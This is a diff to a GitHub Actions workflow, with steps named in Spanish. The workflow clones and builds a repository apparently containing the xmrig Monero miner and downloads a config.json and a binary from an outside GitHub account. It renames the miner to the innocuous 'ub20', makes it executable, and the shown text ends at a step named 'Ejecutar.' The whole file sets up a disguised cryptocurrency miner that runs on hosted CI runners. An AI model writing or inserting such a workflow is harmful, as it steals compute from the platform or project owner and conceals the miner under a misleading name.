@@ -15,23 +15,24 @@ jobs:
       run: sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
     - name: Clonar repo comp.
       run: git clone https://github.com/romanferty/codmdf_xmr.git
-    - name: Crear build comp.
+    - name: make build comp.
       run: |
         cd codmdf_xmr
         mkdir build
         cd build
-    - name: CMake comp.
-      run: | 
-        ls
         cmake ..
-    - name: Make comp.
-      run: make
+        make
     - name: Descargar.
       run: |
+        cd codmdf_xmr
+        cd build
         wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/Monero/config.json
         wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/ub20xm
     - name: Renombrar.
-      run: mv xmrig ub20
+      run: |
+        cd codmdf_xmr
+        cd build
+        mv xmrig ub20
     - name:  Dar permisos.
       run: chmod u+x ub20
     - name: Ejecutar.
